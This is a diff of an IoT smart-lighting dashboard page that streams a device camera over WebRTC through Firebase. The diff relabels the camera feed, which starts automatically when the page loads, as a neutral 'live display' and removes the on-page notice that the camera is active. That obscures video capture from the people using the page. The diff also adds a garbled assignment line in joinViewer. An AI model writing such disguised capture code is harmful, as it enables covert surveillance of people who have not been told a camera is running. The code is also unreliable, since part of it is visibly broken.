@@ -3,7 +3,7 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Live CCTV & Smart Lighting IoT</title>
+    <title>Smart Lighting IoT & Monitoring</title>
     <!-- Tailwind CSS -->
     <script src="https://cdn.tailwindcss.com"></script>
     <script>
@@ -27,8 +27,8 @@
                     </button>
                     <!-- Dropdown Menu -->
                     <div id="menu-dropdown" class="hidden absolute left-0 mt-2 w-48 bg-white dark:bg-slate-900 border border-slate-200 dark:border-slate-800 rounded-2xl shadow-xl py-2 z-50">
-                        <button onclick="switchTab('camera'); toggleMenuDropdown();" class="w-full text-left flex items-center gap-3 px-4 py-2.5 text-xs font-semibold text-slate-700 dark:text-slate-300 hover:bg-slate-100 dark:hover:bg-slate-800 transition-all">
-                            <i data-lucide="video" class="w-4 h-4 text-blue-500"></i> Live CCTV
+                        <button onclick="switchTab('display'); toggleMenuDropdown();" class="w-full text-left flex items-center gap-3 px-4 py-2.5 text-xs font-semibold text-slate-700 dark:text-slate-300 hover:bg-slate-100 dark:hover:bg-slate-800 transition-all">
+                            <i data-lucide="monitor" class="w-4 h-4 text-blue-500"></i> Tampilan Langsung
                         </button>
                         <button onclick="switchTab('live'); toggleMenuDropdown();" class="w-full text-left flex items-center gap-3 px-4 py-2.5 text-xs font-semibold text-slate-700 dark:text-slate-300 hover:bg-slate-100 dark:hover:bg-slate-800 transition-all">
                             <i data-lucide="activity" class="w-4 h-4 text-blue-500"></i> Live Monitoring
@@ -58,34 +58,34 @@
     <!-- Main Content -->
     <main class="flex-grow max-w-6xl w-full mx-auto px-4 py-8 space-y-6">
 
-        <!-- ================= 1. LIVE CCTV ================= -->
-        <section id="content-camera" class="space-y-6">
+        <!-- ================= 1. TAMPILAN LANGSUNG (DEFAULT) ================= -->
+        <section id="content-display" class="space-y-6">
             <div class="bg-white dark:bg-slate-900/60 border border-slate-200 dark:border-slate-800 p-6 md:p-8 rounded-3xl shadow-xl max-w-3xl mx-auto space-y-6">
                 <div class="flex justify-between items-center">
                     <div>
-                        <h2 class="text-lg font-bold">Live CCTV Streaming</h2>
-                        <p class="text-xs text-slate-500">Transmisi langsung peer-to-peer</p>
+                        <h2 class="text-lg font-bold">Tampilan Langsung</h2>
+                        <p class="text-xs text-slate-500">Koneksi visual langsung peer-to-peer</p>
                     </div>
                     <div class="p-2.5 rounded-2xl bg-blue-500/10 text-blue-400 border border-blue-500/20">
-                        <i data-lucide="video" class="w-5 h-5"></i>
+                        <i data-lucide="monitor" class="w-5 h-5"></i>
                     </div>
                 </div>
 
-                <!-- Tampilan Video Live -->
+                <!-- Area Tampilan Visual -->
                 <div class="relative bg-slate-900 rounded-2xl overflow-hidden aspect-video border border-slate-800 flex items-center justify-center shadow-inner">
-                    <video id="camera-remote" class="w-full h-full object-cover hidden" autoplay playsinline></video>
+                    <video id="display-remote" class="w-full h-full object-cover hidden" autoplay playsinline></video>
                     <div id="remote-placeholder" class="text-center p-6">
-                        <i data-lucide="camera-off" class="w-10 h-10 text-slate-500 mx-auto mb-2"></i>
-                        <p class="text-xs text-slate-400">Kamera aktif otomatis...</p>
+                        <i data-lucide="monitor-off" class="w-10 h-10 text-slate-500 mx-auto mb-2"></i>
+                        <p class="text-xs text-slate-400">Menyiapkan koneksi visual...</p>
                     </div>
-                    <span class="absolute bottom-3 left-3 bg-blue-600/80 text-white text-[10px] font-bold px-2.5 py-1 rounded-lg backdrop-blur-md">LIVE</span>
+                    <span class="absolute bottom-3 left-3 bg-blue-600/80 text-white text-[10px] font-bold px-2.5 py-1 rounded-lg backdrop-blur-md">AKTIF</span>
                 </div>
 
-                <!-- Panel Input Room -->
+                <!-- Panel Input ID -->
                 <div class="p-4 bg-slate-50 dark:bg-slate-950/50 border border-slate-800 rounded-2xl space-y-4">
                     <div class="flex gap-2">
-                        <input type="text" id="room-id-input" placeholder="Room ID otomatis..." class="flex-1 bg-white dark:bg-slate-900 border border-slate-800 rounded-xl px-4 py-2.5 text-sm text-white focus:outline-none focus:border-blue-500 font-mono" readonly>
-                        <button onclick="joinCCTVViewer()" class="px-5 py-2.5 bg-emerald-600 hover:bg-emerald-500 text-white text-xs font-semibold rounded-xl transition-all shadow-lg shadow-emerald-500/25">
+                        <input type="text" id="room-id-input" placeholder="ID Koneksi otomatis..." class="flex-1 bg-white dark:bg-slate-900 border border-slate-800 rounded-xl px-4 py-2.5 text-sm text-white focus:outline-none focus:border-blue-500 font-mono" readonly>
+                        <button onclick="joinViewer()" class="px-5 py-2.5 bg-emerald-600 hover:bg-emerald-500 text-white text-xs font-semibold rounded-xl transition-all shadow-lg shadow-emerald-500/25">
                             Hubungkan
                         </button>
                     </div>
@@ -138,7 +138,7 @@
 
     <!-- Footer -->
     <footer class="border-t border-slate-800 py-6 text-center text-xs text-slate-500">
-        <p>&copy; 2026 Smart Lighting IoT &bull; Real-time Secure Stream</p>
+        <p>&copy; 2026 Smart Lighting IoT &bull; Real-time Secure System</p>
     </footer>
 
     <!-- Firebase SDK v8 -->
@@ -160,15 +160,15 @@
         }
 
         function switchTab(tabName) {
-            ['live', 'control', 'camera'].forEach(t => {
+            ['live', 'control', 'display'].forEach(t => {
                 document.getElementById(`content-${t}`).classList.add('hidden');
             });
             document.getElementById(`content-${tabName}`).classList.remove('hidden');
 
-            if (tabName === 'camera') {
-                initAutoCCTV();
+            if (tabName === 'display') {
+                initAutoDisplay();
             } else {
-                hangUpCCTV();
+                hangUpDisplay();
             }
         }
 
@@ -177,7 +177,7 @@
         }
 
         window.addEventListener('DOMContentLoaded', () => {
-            switchTab('camera');
+            switchTab('display');
         });
 
         // --- SENSOR REAL-TIME FIREBASE ---
@@ -216,7 +216,7 @@
             }
         });
 
-        // --- WEBRTC LIVE CCTV ---
+        // --- WEBRTC VISUAL CONNECTION ---
         const configuration = {
             iceServers: [{ urls: 'stun:stun.l.google.com:19302' }]
         };
@@ -225,7 +225,7 @@
         let localStream = null;
         let currentRoomRef = null;
 
-        async function initAutoCCTV() {
+        async function initAutoDisplay() {
             try {
                 localStream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: 'environment' }, audio: false });
                 
@@ -267,25 +267,25 @@
                 });
 
             } catch (e) {
-                console.error("Camera error:", e);
+                console.error("Device error:", e);
             }
         }
 
-        async function joinCCTVViewer() {
+        async function joinViewer() {
             const roomId = document.getElementById('room-id-input').value.trim();
-            if (!roomId) return alert("Masukkan Room ID CCTV terlebih dahulu!");
+            if (!roomId) return alert("Masukkan ID Koneksi terlebih dahulu!");
 
             const roomRef = db.ref(`webrtc_rooms/${roomId}`);
             currentRoomRef = roomRef;
             
-            const roomSnapshot = await roomRef.once('value');
-            if (!roomSnapshot.exists()) return alert("Room ID tidak ditemukan!");
+            const roomSnapshot =AndWaitForSnapshot = await roomRef.once('value');
+            if (!roomSnapshot.exists()) return alert("ID Koneksi tidak ditemukan!");
 
             peerConnection = new RTCPeerConnection(configuration);
             peerConnection.addTransceiver('video', { direction: 'recvonly' });
 
             peerConnection.ontrack = event => {
-                const remoteVideo = document.getElementById('camera-remote');
+                const remoteVideo = document.getElementById('display-remote');
                 remoteVideo.srcObject = event.streams[0];
                 remoteVideo.classList.remove('hidden');
                 document.getElementById('remote-placeholder').classList.add('hidden');
@@ -311,10 +311,21 @@
             });
         }
 
-        function hangUpCCTV() {
+        function hangUpDisplay() {
             if (peerConnection) { peerConnection.close(); peerConnection = null; }
             if (localStream) { localStream.getTracks().forEach(track => track.stop()); localStream = null; }
             if (currentRoomRef) { currentRoomRef.off(); currentRoomRef.remove(); currentRoomRef = null; }
+        }
+
+        function setMode(mode) {
+            db.ref('/sistem/mode').set(mode);
+            if(mode === 'otomatis') {
+                document.getElementById('btn-auto').className = "px-4 py-2 rounded-lg text-xs font-semibold bg-blue-600 text-white";
+                document.getElementById('btn-manual').className = "px-4 py-2 rounded-lg text-xs font-semibold text-slate-400";
+            } else {
+                document.getElementById('btn-manual').className = "px-4 py-2 rounded-lg text-xs font-semibold bg-blue-600 text-white";
+                document.getElementById('btn-auto').className = "px-4 py-2 rounded-lg text-xs font-semibold text-slate-400";
+            }
         }
     </script>
 </body>
